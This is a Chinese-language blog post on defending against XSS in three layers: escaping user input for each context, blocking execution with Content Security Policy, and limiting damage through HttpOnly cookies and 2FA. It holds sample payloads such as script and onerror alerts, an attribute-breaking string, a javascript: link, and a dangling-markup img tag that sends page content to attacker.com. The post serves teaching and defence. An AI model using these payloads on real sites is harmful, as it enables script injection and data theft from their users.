---
title: 淺談 XSS 攻擊與防禦的各個環節
date: 2021-06-17
tags: [Security, Front-end]
author: huli
layout: zh-tw/layouts/post.njk
image: /img/posts/huli/attack-and-defense/cover.jpeg
canonical: https://blog.huli.tw/2021/06/19/xss-attack-and-defense/
---

## 前言

<!-- summary -->
談到 XSS（Cross-site scripting），許多人可能都只想到「就是網站上被攻擊者植入程式碼」，但若是仔細去想的話，會發現這之中其實還有很多環節都可以再深入探討。
<!-- summary -->

而我所謂的這些「環節」，也可以理解成不同的「關卡」。

舉例來說，第一關當然就是盡可能防止自己的網站被 XSS 攻擊，不要讓攻擊者在網站中能夠植入程式碼。而「讓攻擊者在網站中植入程式碼」這件事，又可以往下再細分成不同地方的植入，例如說 HTML 的植入，或者是 HTML 元素屬性中的植入，又或是 JavaScript 程式碼中的植入，這些都有著不同的攻擊以及防禦方式。

而除了防止被植入程式碼以外，防守方應該還要進一步去想：「那如果真的不幸被植入程式碼了，可以怎麼辦？」

這就是第二個關卡。雖然說第一關我們已經盡可能做好準備了，但難保不會有漏洞產生，因此守好第一關是不夠的，也要對第二關進行防守。

假設今天攻擊者真的找到一個地方植入程式碼，那我們是不是可以想辦法阻止它執行？這就是 CSP（Content Security Policy）出場的時候了，藉由設定一些規則讓不合法的程式碼無法執行。例如說可以讓 inline 的 JavaScript 無法執行，那 `<img src=x onerror=alert(1)>` 就會變得無效。

若是攻擊者真的很厲害，連 CSP 的規則都繞過了呢？這時就進入到第三關了，第三關的假設是攻擊者已經能夠在網站上執行任意程式碼。

這時候還可以防守什麼呢？那就是試圖把損害控制到最低。

以 Medium 這種部落格的平台來說，若是可以利用 XSS 把別人的帳號奪走（account takevoer），就是個嚴重的漏洞；或是因為 Medium 有付費牆的功能，因此若是能透過 XSS 把錢轉到攻擊者的帳號，也會是一個很嚴重的問題。

而我們要在「網站已經被 XSS」的前提下，試圖去防禦這些攻擊。

接著，就讓我們來看看不同的關卡有哪些不同的防禦方法。

## 第一關：阻止攻擊者在網站植入程式碼

要防止 XSS 的第一步，當然就是阻止攻擊者在網站上植入他們想要的東西，核心精神可以濃縮成一句：

> 永遠不要相信使用者的輸入

只要是有輸入的地方，都應該去做驗證。在輸出不被信任的資料時應該要做跳脫（escape）。

舉例來說，今天有個地方可以讓使用者設定自己的暱稱，因為使用者可以自己輸入東西，所以在輸出這邊的資料時就要特別注意。

如果在 render 時就是直接把使用者的輸入原封不動 render 出來，那若是使用者輸入的暱稱是：`<script>alert(1)</script>`，任何人瀏覽這一頁的時候就會看到畫面跳出一個 alert，因為暱稱輸入的東西被當作程式碼執行了。

這種攻擊可以成立的主因就是使用者的輸入變成了程式碼的一部分，導致未預期的行為。

要防止這種行為，就是在 render 的時候要做跳脫。例如說要先把 `<` 轉成 `&lt`，這樣在畫面上看到的依然是 `<`，但是對 parser 來說那並不是標籤開始的符號，而是文字的 `<`，就不會被當作 HTML 標籤來解析。

如此一來，就能防止攻擊者植入程式碼。

不過，這還只是對跳脫的粗淺理解而已，真正需要注意的是在不同的情境之下，可能會需要用不同的方式跳脫，就如同這兩篇講的一樣：

1. [Re: [討論] 為什麼SQL注入和XSS漏洞會這麼氾濫?(1)](https://www.ptt.cc/bbs/Soft_Job/M.1582437563.A.6F7.html)
2. [Re: [討論] 為什麼SQL注入和XSS漏洞會這麼氾濫?(2)](https://www.ptt.cc/bbs/Soft_Job/M.1582441681.A.A7B.html)

假設你只有想到說要對標籤做跳脫，把 `<>` 這兩個符號都做了 escape，那確實沒有辦法直接插入標籤。可是，如果 render 暱稱的地方是這樣呢？

``` html
<img src="<?= avatar_url ?>" alt="<?= nickname ?>" /><div><?= nickname ?></div>
```

除了在 div 裡面輸出暱稱之外，也會在 img 的 alt 標籤裡把暱稱 render 出來。這時候如果只跳脫了 `<>` 是不夠的，因為如果我讓 nickname 變成 `" onload="alert(1)` 的話，結合起來就會變成：

``` html
<img src="avatar_url" alt="" onload="alert(1)" /><div>" onload="alert(1)</div>
```

攻擊者可以利用 `"` 關閉前面的屬性，然後創出一個新的屬性 `onload`，達成 HTML 標籤屬性利用的 XSS。

所以常見的特殊符號像是 `"'<>` 都要去做 escape，才能確保在不同地方時都有防禦效果。而這點其實許多程式語言或是 framework 都有做到了，例如說 PHP 的 htmlspecialchars：

![xss1](https://user-images.githubusercontent.com/2755720/122629700-8743df00-d0f1-11eb-937b-910934140e96.png)

那這樣就打完收工了嗎？還沒。

因為，在連結裡的內容又是另外一回事了，例如說：`<a href="<?= link ?>">my website</a>`

有一種東西叫做 JavaScript pseudo-protocol，可以利用 `javascript:` 來執行 JS 程式碼，像是這樣：`<a href="javascript:alert(1)">my website</a>`，在使用者點擊這個連結時，就會跳出 alert。

而 `javascript:alert(1)` 這幾個字，完全沒有包含我們上面需要 escape 的特殊字元 `"'<>&`，所以在這個狀況我們需要有不同的 escape 方法，或者是直接檢查內容，指定開頭必須要是 `http://` 或是 `http://` 之類的。

這就是我剛剛講的，在不同地方，需要用不同的方式來進行跳脫及防禦。如果都是用同一種的話，有些地方就會失效。

有些人看到這邊會想說：「阿～不用擔心啦！我用的前端框架都幫我做好了，預設都會 escape 啦！不會被 XSS」

這個宣稱大部分是對的，現在確實很多前端的框架會處理這件事，但要特別注意我剛剛提的 href 的例子，因為 `javascript:alert(1)` 這幾個字元都不是特殊字元，所以跳脫完還是長一樣，依然會有這樣的漏洞。

React 在 v16.9 的時候就針對這個 case 新增了警告：[Deprecating javascript: URLs](https://reactjs.org/blog/2019/08/08/react-v16.9.0.html#deprecating-javascript-urls)，並且在之後的 release 中會自動阻擋這個行為。不過根據測試的結果，目前的版本 v17.0.2 只會警告而已，還不會阻擋。

這邊有一些相關的討論：[React@16.9 block javascript:void(0); #16592](https://github.com/facebook/react/issues/16592) 與 [False-positive security precaution warning (javascript: URLs) #16382](https://github.com/facebook/react/issues/16382)，想看程式碼的話在這邊：[react/packages/react-dom/src/shared/sanitizeURL.js ](https://github.com/facebook/react/blob/v17.0.2/packages/react-dom/src/shared/sanitizeURL.js)。

除了看使用情境跳脫不是件容易的事情以外，意識到有哪些地方是使用者可以自己輸入的也沒有想像中簡單。

因為除了資料庫或者是 API 是你的資料來源之外，URL 可能也是。有些程式碼會直接把網址列上的某個 query string 放到 JS 裡，之後直接把這個變數輸出到畫面上，這就是無意間信任了不該信任的資料。

舉例來說，搜尋頁面的網址可能長這樣：`https://example.com/search?q=hello`，而在程式中是這樣寫的：

``` js
const q = 'hello' // 從網址列拿下來的參數
document.querySelector('.search').innerHTML = q
```

這時如果你把 q 換成 HTML：`<script>alert(1)</script>`，在沒做跳脫就輸出的狀況下，就會有 XSS 漏洞的產生。

最後呢，有些網站會允許內容有部分的 HTML，最常見的就是部落格，因為部落格要有樣式嘛，除非是自訂資料格式，不然有些網站都直接把內文存成 HTML，然後用 [DOMPurify](https://github.com/cure53/DOMPurify) 或是 [js-xss](https://github.com/leizongmin/js-xss) 之類的套件去過濾，把不合法的標籤或是屬性過濾掉。

雖然說使用這些 library 相對安全，但需要注意的是版本要時常更新，因為這類型的套件也可能會有漏洞的產生（[Mutation XSS via namespace confusion – DOMPurify < 2.0.17 bypass](https://research.securitum.com/mutation-xss-via-mathml-mutation-dompurify-2-0-17-bypass/)）。另外也需要注意使用時的設定，設定錯誤的話也有可能造成問題，實際案例可以參考：[防止 XSS 可能比想像中困難](https://medium.com/cymetrics/prevent-xss-might-be-harder-than-you-thought-ce8c422540b)。

總結一下，想要做好第一關的 XSS 防禦，需要注意的事情有：

1. 意識到哪邊是使用者可以自己輸入資料的地方
2. 針對不同情境去做 XSS 的防禦

也可以考慮導入現成的 [WAF](https://www.cloudflare.com/zh-tw/learning/ddos/glossary/web-application-firewall-waf/)（Web Application Firewall），直接幫你把一些看起來很可疑的 payload 擋住。不過 WAF 也不是百分百有效，只是多一道防線而已。
或是也可以關心一下這個比較新的東西：[Trusted Types](https://web.dev/trusted-types/)。

## 第二關：阻止惡意程式碼被執行

假設第一關被突破了，攻擊者可以在網站上插入任意程式碼，這時候要考慮的事情就是如何阻止程式碼被執行。

這一關的重點是 CSP，Content Security Policy。

CSP 是一系列的規則，用來跟瀏覽器講說哪些來源的資源可以被載入，哪些不行，可以利用 response header 或是 `<meta>` tag 來指定頁面的 CSP 規則。

舉例來說，如果我很確定網站上的 JS 都來自於同一個 origin，那我的 CSP 就可以這樣寫：

``` js
Content-Security-Policy: default-src 'self'; script-src 'self'
```

`self` 代表的是 same origin 的意思。這樣寫的話，如果你試著載入不是當前 origin 的 JS，或者是直接在頁面上用 inline 的方式執行 script，都會看到瀏覽器報錯：

![xss2](https://user-images.githubusercontent.com/2755720/122629705-8f038380-d0f1-11eb-851d-04ed70c19317.png)

CSP 可以制定許多不同資源的規則，需要更詳細的解釋可以看這邊：[Content Security Policy Reference](https://content-security-policy.com/)。想找到比較完整的 CSP，去看一些大公司的實作是最快的，接著我們直接來看一下 GitHub 的 CSP 長什麼樣子（為了方便閱讀，有重新排版過）：

``` csp
default-src 'none'

base-uri 'self';

block-all-mixed-content;

connect-src 'self' uploads.github.com www.githubstatus.com collector.githubapp.com
api.github.com github-cloud.s3.amazonaws.com github-production-repository-file-5c1aeb.s3.amazonaws.com
github-production-upload-manifest-file-7fdce7.s3.amazonaws.com github-production-user-asset-6210df.s3.amazonaws.com
html-translator.herokuapp.com cdn.optimizely.com logx.optimizely.com/v1/events wss://alive.github.com
*.actions.githubusercontent.com wss://*.actions.githubusercontent.com online.visualstudio.com/api/v1/locations
insights.github.com;

font-src github.githubassets.com;

form-action 'self' github.com gist.github.com;

frame-ancestors 'none';

frame-src render.githubusercontent.com;

img-src 'self' data: github.githubassets.com identicons.github.com collector.githubapp.com github-cloud.s3.amazonaws.com
secured-user-images.githubusercontent.com/ *.githubusercontent.com;

manifest-src 'self';

media-src github.com user-images.githubusercontent.com/;

script-src github.githubassets.com;

style-src 'unsafe-inline' github.githubassets.com;

worker-src github.com/socket-worker-3f088aa2.js gist.github.com/socket-worker-3f088aa2.js
```

想要檢查 CSP 規則有沒有明顯漏洞的話，可以到 [CSP Evaluator](https://csp-evaluator.withgoogle.com/)，而 GitHub 的 CSP 設置得很嚴謹，幾乎每一種資源都有設定。

這邊可以看到 script-src 的值只有 `github.githubassets.com`。因為沒有 `unsafe-inline` 的關係，所以 inline script 無法執行，而引入 script 的話也只能從 `github.githubassets.com` 這個來源引入，幾乎封死了執行 script 的路。

而許多網站的 CSP 其實並不會設置得這麼嚴格，就有比較高的機率會被繞過，例如說 [A Wormable XSS on HackMD!](https://blog.orange.tw/2019/03/a-wormable-xss-on-hackmd.html) 直接用 cloudflare CDN 上的 AngularJS + CSTI 繞過；[HackMD Stored XSS & Bypass CSP with Google Tag Manager](https://github.com/k1tten/writeups/blob/master/bugbounty_writeup/HackMD_XSS_%26_Bypass_CSP.md) 則是用 Google Tag Manager 來繞。

另外，在某些情境之下就算乍看被封死，依然可以透過現有的 script 來幫你繞過，詳細資訊可以參考這個很經典的演講：[Breaking XSS mitigations via Script gadgets](https://github.com/google/security-research-pocs/tree/master/script-gadgets)。

那如果真的沒辦法執行 script，還有什麼可以做的呢？

就算只是插入 HTML，也還是可以做事的。

例如說可以利用插入 HTML meta tag 來造成重新導向，把使用者導到惡意網站去，像這樣：`<meta http-equiv="refresh" content="0;https://example.com">`。

或者是插入 `<img src="https://attacker.com?q=`（注意這邊 src 的雙引號只有開頭），讓整段 HTML 變成：

``` html
<img src="https://attacker.com?q=
<div>user info</div>
<div>sensitive data</div>
<div class="test"></div>
```

藉由 src 沒有閉合的 `"`，就可以拿到下一個 `"` 為止的 HTML 內容，把這些當作 query string 的一部分傳到 server，而這中間可能就會有一些敏感資料的存在。所以 `img-src` 的 CSP 規則也是有用處的，可以防止這類型的攻擊。

或也可以結合 [DOM Clobbering](https://blog.huli.tw/2021/01/23/dom-clobbering/)，看看有沒有什麼地方可以攻擊。

因此，就算不能執行 script，依然有其他攻擊手法可以用。

GitHub 在 2017 年時有寫過一篇 [GitHub’s post-CSP journey](https://github.blog/2017-01-19-githubs-post-csp-journey/)，特別講了他們的 CSP 是怎麼設計的，是為了防範哪些已知的攻擊，寫得非常不錯。他們甚至還有一個 bug bounty 是 [GitHub CSP](https://bounty.github.com/targets/csp.html)，就算沒有找到 XSS 也沒有關係，只要提出能繞過 CSP 的手法就可以拿到獎金。

## 第三關：降低 XSS 攻擊之損害

如果街亭跟前兩關都沒守住，XSS 勢在必行的話，接下來要思考的就是該如何降低 XSS 攻擊之損害。

這邊我覺得有兩個面向可以去思考：

1. 避免攻擊者用受害者的身份登入
2. 避免攻擊者透過 XSS 進行比較重要的操作

先來談第一種，有一種最常見的攻擊方式就是偷 cookie，把 document.cookie 偷走之後，若是使用者驗證身份的 token 在裡面，就可以直接用受害者的身份登入。因此這種驗證用的 cookie，請記得設定 `HttpOnly`，就能確保前端無法直接用 document.cookie 就取得 cookie。

如果因為各種原因沒辦法保護使用者的 token，那就可以再設下其他關卡，例如說最常見的就是地點的檢查。假設一個使用者一直以來都在台灣，可是卻突然在烏克蘭發了一個 request，這時就可以先把這個操作擋住，並寄信告知使用者有可疑操作，麻煩他確認是否為本人。或也可以檢查使用者的瀏覽器是否一致，不一致的話一樣要先經過確認，加上另一道手續來保障使用者的安全。

再來談第二種，就算 cookie 沒被偷走，因為攻擊者已經能執行任意程式碼了，所以直接打後端 API 還是做得到的，而且 cookie 會自動帶上。因此只要是使用者可以做的操作，攻擊者基本上都做得到。

以部落格平台來說的話，發文、編輯文章或是刪文都是做得到的，攻擊者就只要直接利用 XSS 去打 API 就行了。

這時候對於一些比較重要的操作，就應該設置第二道關卡，例如說更改密碼需要輸入原密碼，那這樣因為攻擊者不知道原密碼是什麼，打 API 也沒有用。或者是要轉帳的時候需要用手機接收驗證碼，沒有手機的話就無法執行操作。

![xss3](https://user-images.githubusercontent.com/2755720/122629715-96c32800-d0f1-11eb-971b-10f405ebd010.png)

其實說白話一點就是 2FA（Two-factor authentication）啦。對於這些重要操作，除了登入之外還要設下第二種可以確認是本人的機制，這樣就算被打出 XSS，攻擊者也無法執行這些操作，可以讓損害降低。

## 總結

資安的世界既廣又深，這篇提到的都只是大方向的概觀而已。若是再深入下去，每個環節都可以再變成多個獨立的主題，而且也可以結合其他的攻擊，例如說：

1. 自訂的 XSS 過濾規則有沒有可能有漏洞，會被繞過？有的話又該怎麼繞？
2. 儘管都過濾了，會不會其實 server side 的漏洞可以幫忙繞過？例如說 double encoding
3. CSP 設得夠嚴謹嗎？有沒有現成的繞過方式？
4. 2FA 機制有實作完整嗎？rate limit 有設好嗎？沒有設的話是不是暴力破解就被爆破了？
5. 忘記密碼的機制有實作正確嗎？會不會可以用別人的身份幫忙重設密碼？

XSS 並不是全有或是全無這麼簡單，有的網站雖然被 XSS，但影響範圍有限，而有的網站一被 XSS，連使用者的帳號密碼都可以輕易更改，直接把帳號給搶過來。

在防禦 XSS 的時候，如果只防禦了第一關，只有想到「我要把 render 的內容 escape」就容易造成上面所講的狀況，要嘛就是整個網站都很安全連 XSS 都沒有，要嘛就是一被打出 XSS，整個網站就被打穿。

所以在防禦的時候必須注意到上面提的這些不同的環節，針對每個環節都去做防禦，設下多個防線。就算攻擊者可以突破第一關，可能也會被第二關的 CSP 擋下，無法執行 JS；就算第二關被破了，還有第三關守著，降低 XSS 的影響程度，不會因為一個漏洞就讓使用者的帳戶整個被搶走。
